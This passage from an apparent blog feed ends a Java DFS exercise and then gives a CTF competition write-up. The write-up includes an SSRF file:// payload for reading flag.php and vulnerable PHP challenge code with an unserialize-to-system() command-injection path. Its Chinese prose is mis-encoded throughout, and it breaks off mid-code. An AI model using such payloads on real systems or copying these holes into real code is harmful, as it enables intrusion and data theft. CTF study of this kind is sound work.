number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//å½“å…ƒç´ è¿‡å¤šæ— æ³•åˆ—ä¸¾æ—¶ï¼ŒåŠ¨æ€ç”³è¯·æ•°ç»„ä»¥ä¸‹é¢è¿™ç§æ–¹å¼</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">char</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> flag1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//ç”¨Scannerå®šä¹‰è¾“å…¥</span>        Scanner cin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//ç›¸å½“äºc++ä¸­çš„EOFåˆ¤æ–­</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>cin<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            flag1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>m <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> n <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                m <span class="token operator">=</span> cin<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                n <span class="token operator">=</span> cin<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> flag <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> flag<span class="token operator">++</span><span class="token punctuation">)</span>                    map<span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">=</span> cin<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//                for (i = 0; i &lt; m; i++) {</span><span class="token comment" spellcheck="true">//                    for (j = 0; j &lt; n; j++) {</span><span class="token comment" spellcheck="true">//                        //map[i][j] = mapstrings[i][j];</span><span class="token comment" spellcheck="true">//                        System.out.print(map[i][j]);</span><span class="token comment" spellcheck="true">//                    }</span><span class="token comment" spellcheck="true">//                    System.out.print('\n');</span><span class="token comment" spellcheck="true">//                }</span><span class="token comment" spellcheck="true">//            }</span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">//        }</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'@'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>                            flag1 <span class="token operator">=</span> flag1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>flag1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><blockquote><p>å…¶å®æ˜¯é¡ºä¾¿ç»ƒä¹ ä¸€ä¸‹javaï¼Œc++å’Œjavaæœ‰æ¯”è¾ƒå¤šç›¸ä¼¼ä¹‹å¤„ï¼Œä½†æ˜¯ä¹Ÿæœ‰ä¸€äº›ä¸åŒçš„åœ°æ–¹ï¼Œæ‰€ä»¥éœ€è¦å¥½å¥½æ³¨æ„ã€‚</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;â€¦â€¦&lt;/p&gt;
    
    </summary>
    
      <category term="ç®—æ³•" scheme="http://www.yof3ng.xyz/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="DFS" scheme="http://www.yof3ng.xyz/tags/DFS/"/>
    
      <category term="algorithm" scheme="http://www.yof3ng.xyz/tags/algorithm/"/>
    
      <category term="ç®—æ³•" scheme="http://www.yof3ng.xyz/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="coding" scheme="http://www.yof3ng.xyz/tags/coding/"/>
    
  </entry>
  
  <entry>
    <title>ç¬¬å››å±Šå…¨å›½é‚€è¯·èµ›_èµ›åå°ç»“</title>
    <link href="http://www.yof3ng.xyz/2018/11/06/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E4%B8%8A%E6%B5%B7%E7%BD%91%E5%AE%89%E6%9A%A8%E5%85%A8%E5%9B%BD%E9%82%80%E8%AF%B7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E5%B0%8F%E7%BB%93/"/>
    <id>http://www.yof3ng.xyz/2018/11/06/ç¬¬å››å±Šä¸Šæµ·ç½‘å®‰æš¨å…¨å›½é‚€è¯·èµ›-èµ›åå°ç»“/</id>
    <published>2018-11-06T02:32:35.000Z</published>
    <updated>2019-04-02T09:06:05.630Z</updated>
    
    <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="ç¬¬å››å±Šä¸Šæµ·ç½‘å®‰æš¨å…¨å›½é‚€è¯·èµ›-èµ›åå°ç»“"><a href="#ç¬¬å››å±Šä¸Šæµ·ç½‘å®‰æš¨å…¨å›½é‚€è¯·èµ›-èµ›åå°ç»“" class="headerlink" title="ç¬¬å››å±Šä¸Šæµ·ç½‘å®‰æš¨å…¨å›½é‚€è¯·èµ›_èµ›åå°ç»“"></a>ç¬¬å››å±Šä¸Šæµ·ç½‘å®‰æš¨å…¨å›½é‚€è¯·èµ›_èµ›åå°ç»“</h1><blockquote><p>æ‰“å®Œè¿™ä¸ªç¬¬å››å±Šä¸Šæµ·å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨ç«èµ›åï¼Œç®€å•åšä¸ªå°ç»“ï¼Œå·©å›ºä¸€ä¸‹ğŸ˜­ã€‚</p></blockquote><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="ç­¾åˆ°BASE32"><a href="#ç­¾åˆ°BASE32" class="headerlink" title="ç­¾åˆ°BASE32"></a>ç­¾åˆ°BASE32</h3><blockquote><p>ç¬¬ä¸€é“é¢˜æ˜¯BASE32ï¼Œç­¾åˆ°é¢˜ï¼Œé£˜è¿‡ã€‚</p></blockquote><h3 id="pycåç¼–è¯‘"><a href="#pycåç¼–è¯‘" class="headerlink" title="pycåç¼–è¯‘"></a>pycåç¼–è¯‘</h3><blockquote><p>ç¬¬äºŒé¢˜æ˜¯pythonçš„åç¼–è¯‘ï¼Œä¸€ä¸ªpycæ–‡ä»¶ã€‚</p><p>å¯èƒ½æˆ‘æ˜¯ç¢°å·§åšå‡ºæ¥çš„ï¼Œé€šè¿‡importå¯¼åŒ…ï¼ˆimportæ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œpycéƒ½èƒ½å¯¼ï¼‰ï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªåˆ—è¡¨<code>[0,10,7,1,29,14,7,22,22,31,57,30,9,52,27]</code>ï¼ŒæŒ‰åˆ—è¡¨é¡ºåºä¾æ¬¡å¯¹â€fâ€,â€lâ€,â€aâ€,â€gâ€,å¼‚æˆ–å¯ä»¥å¾—åˆ°keyå€¼ä¸º102ï¼Œç„¶åå¯¹åˆ—è¡¨è¿›è¡Œå¼‚æˆ–æ“ä½œå¯ä»¥å¾—åˆ°flagã€‚</p><p>ä½†æ˜¯å¤§ä½¬ä»¬æ˜¯æ€ä¹ˆå»åšè¿™é¢˜çš„å‘¢ï¼šå‘ç°pycæ–‡ä»¶ä¸­æœ‰æ¶æ„æ’å…¥çš„ä¸€è¡Œå­—èŠ‚ç ï¼Œæ­£æ˜¯å› ä¸ºè¿™ä¸ªï¼Œå¯¼è‡´pycæ— æ³•è¢«åç¼–è¯‘ï¼Œåˆ é™¤ä¹‹ååç¼–è¯‘å¯ä»¥å¾—åˆ°ï¼š</p><pre class=" language-assembly"><code class="language-assembly">1       0  JUMP_ABSOLUTE         6  'to 6'           3             6  JUMP_ABSOLUTE         9  'to 9'           9  LOAD_CONST            0  ''          12  LOAD_CONST            1  10          15  LOAD_CONST            2  7          18  LOAD_CONST            3  1          21  LOAD_CONST            4  29          24  LOAD_CONST            5  14          27  LOAD_CONST            2  7          30  LOAD_CONST            6  22          33  LOAD_CONST            6  22          36  LOAD_CONST            7  31          39  LOAD_CONST            8  57          42  LOAD_CONST            9  30          45  LOAD_CONST           10  9          48  LOAD_CONST           11  52   2      51  LOAD_CONST           12  27          54  BUILD_LIST_15        15          57  STORE_NAME            0  'cmp'   3      60  LOAD_NAME             1  'raw_input'          63  CALL_FUNCTION_0       0   4      66  STORE_NAME            2  'flag'          69  LOAD_CONST            0  ''          72  STORE_NAME            3  'm'          75  SETUP_LOOP           91  'to 169'          78  LOAD_NAME             2  'flag'          81  GET_ITER          82  FOR_ITER             83  'to 168'          85  STORE_NAME            4  'i'          88  LOAD_NAME             5  'ord'          91  LOAD_NAME             4  'i'          94  CALL_FUNCTION_1       1          97  UNARY_INVERT          98  LOAD_CONST           13  102         101  BINARY_AND         102  LOAD_NAME             5  'ord'         105  LOAD_NAME             4  'i'         108  CALL_FUNCTION_1       1         111  LOAD_CONST           18  -103         114  BINARY_AND         115  BINARY_OR         116  STORE_NAME            4  'i'         119  LOAD_NAME             4  'i'         122  LOAD_NAME             0  'cmp'         125  LOAD_NAME             3  'm'         128  BINARY_SUBSCR         129  COMPARE_OP            2  '=='         132  POP_JUMP_IF_FALSE   144  'to 144'         135  LOAD_NAME             3  'm'   8     138  UNARY_NEGATIVE         139  LOAD_CONST           14  -1         142  BINARY_ADD         143  UNARY_NEGATIVE  10     144  STORE_NAME            3  'm'         147  JUMP_BACK            73  'to 73'         150  CONTINUE             73  'to 73'         153  LOAD_CONST           15  'wrong'         156  PRINT_ITEM         157  PRINT_NEWLINE_CONT         158  LOAD_NAME             6  'exit'         161  CALL_FUNCTION_0       0         164  POP_TOP         165  JUMP_BACK            73  'to 73'         168  POP_BLOCK       169_0  COME_FROM                '75'         169  LOAD_CONST           16  'right'         172  PRINT_ITEM         173  PRINT_NEWLINE_CONT</code></pre><p>åˆ†ææ¸…æ¥šé€»è¾‘ä¹‹åå¯ä»¥é€†å‡ºflagã€‚</p></blockquote><h3 id="N0find"><a href="#N0find" class="headerlink" title="N0find"></a>N0find</h3><blockquote><p>å¤§æ‚çƒ©ï¼Œé¦–å…ˆé€šè¿‡wiresharkæå–å‡ºä¸¤å¼ å›¾ç‰‡ï¼ˆå®é™…ä¸Šæ•°æ®åŒ…ä¸­è¿˜è—ç€ä¸€äº›ä¸ä¸ºäººçŸ¥çš„ä¸œè¥¿ï¼‰ï¼Œå…¶ä¸­ä¸€å¼ æ˜¯å…³é”®ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/ctfisfun.jpeg" alt=""></p><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸ª<code>ct??????</code>ï¼Œè«éæ˜¯ctfä»€ä¹ˆçš„ï¼Œå…­ä¸ªé—®å·ï¼Œå…«ä½ã€‚ï¼ˆåé¢å®˜æ–¹ç»™å‡ºæç¤ºï¼Œopenbuffï¼ˆæŸä¸€ä¸çŸ¥é“å“ªä¸ªè§’è½çš„éšå†™è½¯ä»¶ï¼‰ï¼Œcrcç¢°æ’ï¼Œä»¥åŠç¢°æ’å‡ºæ¥çš„å€¼ä¸­å«æœ‰fï¼‰ã€‚</p><p>è¿™ä¸ªæ—¶å€™å°±æ‡µé€¼äº†ï¼Œæ‹¿ä»€ä¹ˆå»crcç¢°æ’ï¼Œç¢°æ’å®Œåˆèƒ½å¹²å•¥ï¼Ÿ</p><p>ä»”ç»†çœ‹çœ‹æ•°æ®åŒ…ä¸­ï¼Œå‡ºç°äº†crcå­—çœ¼ï¼Œå¹¶ä¸”å«æœ‰3ä¸ªç–‘ä¼¼crcçš„å€¼ï¼š</p><p><code>C61B1F65</code>,<code>E74E142D</code>,<code>648BDAD5</code></p><p>æ‹¿crcç¢°æ’è„šæœ¬è¿›è¡Œç¢°æ’å¾—åˆ°ä¸‰ç»„ä¸­æ¯ç»„å«æœ‰fçš„å€¼ï¼š</p><p>1.<code>93fjhl    fBWjIv</code></p><p>2.<code>mbof3k      Xez1fW</code></p><p>3.<code>v4gfx1    5fyJIo</code></p><p>ç„¶åæ‹¿openbuffè¿›è¡Œè§£å¯†ï¼Œéœ€è¦ä¸‰ä¸ªå¯†é’¥ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢ä¸‰ç»„è¿›è¡Œæ’åˆ—ç»„åˆï¼Œè€Œä¸”å¼€å¤´è¿˜éœ€è¦åŠ ä¸Šctï¼Œå³å¯getflagã€‚</p></blockquote><h3 id="92"><a href="#92" class="headerlink" title="92"></a>92</h3><blockquote><p>emmmæ²¡å•¥å¥½è¯´çš„ï¼Œè€ƒç‚¹å°±æ˜¯å­—ç¬¦ä¸²åè½¬ï¼Œä»¥åŠå¯¹å­—ç¬¦çš„æ•æ„Ÿæ€§ï¼Œè¿˜æœ‰å¯¹base92çš„äº†è§£ï¼Œé¢˜ç›®ç»™å‡ºäº†92åŸºæœ¬ä¸Šå¯ä»¥çŸ¥é“base92è¿™ç©æ„å„¿äº†ï¼Œåé¢çš„éš¾åº¦ä¸æ˜¯ç‰¹åˆ«å¤§ï¼Œéœ€è¦ä¸€å®šçš„çµæ´»æ€§ã€‚</p></blockquote><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><blockquote><p>è¿™æ¬¡çš„webæ„Ÿè§‰å…¨æ˜¯phpï¼Œæ¯”è¾ƒâ€ç¡¬æ ¸â€ã€‚</p></blockquote><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><blockquote><p>é€šè¿‡post ä¼ admin=1å¹¶ä¸”ç”¨x-client-ipä¼ªé€ æœ¬åœ°ipï¼Œå³å¯åˆ°è¾¾ç”¨urlæ‰“ssrfçš„åœ°æ­¥ï¼Œé€šè¿‡æŒ‡å®šurlï¼Œæ‰“åˆ°çš„å†…å®¹ä¼šä»¥å›¾ç‰‡æ ¼å¼å­˜å‚¨åˆ°downloadç›®å½•ã€‚</p><p>è¿™é‡Œéœ€è¦ç”¨ fileåè®®ï¼Œè€Œä¸æ˜¯httpåè®®ã€‚</p><p>å¤§ä½¬æ˜¯è¿™æ ·æ„é€ urlçš„ï¼š</p><p><code>url=file://@127.0.0.1:80@www.ichunqiu.com/./..//var/www/html/flag.php</code></p><p>è€Œæˆ‘ï¼š</p><p><code>url=file://www.ichunqiu.com/var/www/html/flag.php</code></p><p>å¯èƒ½åˆæ˜¯ç¢°å·§æ‰“åˆ°çš„ï¼Ÿæˆ‘ä»¬å¯ä»¥è·å¾—source.phpçš„æºç ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"you need to login as admin!"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;!-- post param  'admin' -->"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_CLIENT_IP'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'www.ichunqiu.com'</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token variable">$curl</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string">'download/'</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">';img1.jpg'</span><span class="token punctuation">;</span>                <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token variable">$img</span><span class="token operator">=</span><span class="token string">"&lt;img src=\""</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token string">"\"/>"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token variable">$img</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token keyword">echo</span> "you need post url<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.ichunqiu.com";</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"only 127.0.0.1 can get the flag!!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>å®é™…ä¸Šè€ƒçš„æ˜¯<code>libcurl</code>and<code>parse_url()</code>è§£æé—®é¢˜ã€‚</p><p>è¿™é‡Œå¯ä»¥å‚è€ƒ<a href="http://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize(" target="_blank" rel="noopener">ä¸€å¶é£˜é›¶å¸ˆå‚…</a>/)å†™çš„ä¸€ç¯‡åšæ–‡ã€‚</p></blockquote><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><blockquote><p>æ‰«ç›®å½•å¾—swpäº¤æ¢æ–‡ä»¶==&gt;vimæ¢å¤æ–‡ä»¶==&gt;å¾—åˆ°index.phpæºç ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">come</span><span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$method</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span> <span class="token operator">=</span> <span class="token variable">$method</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span> <span class="token operator">=</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$str</span><span class="token operator">=</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[&lt;>*;|?\n ]/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$str</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>               <span class="token keyword">function</span> <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo $host"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"echo"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token variable">$first</span><span class="token operator">=</span><span class="token string">'hi'</span><span class="token punctuation">;</span><span class="token variable">$var</span><span class="token operator">=</span><span class="token string">'var'</span><span class="token punctuation">;</span><span class="token variable">$bbb</span><span class="token operator">=</span><span class="token string">'bbb'</span><span class="token punctuation">;</span><span class="token variable">$ccc</span><span class="token operator">=</span><span class="token string">'ccc'</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">===</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">;</span>            $<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token operator">===</span><span class="token string">"doller"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token operator">===</span><span class="token string">"give"</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$bbb</span><span class="token operator">===</span><span class="token 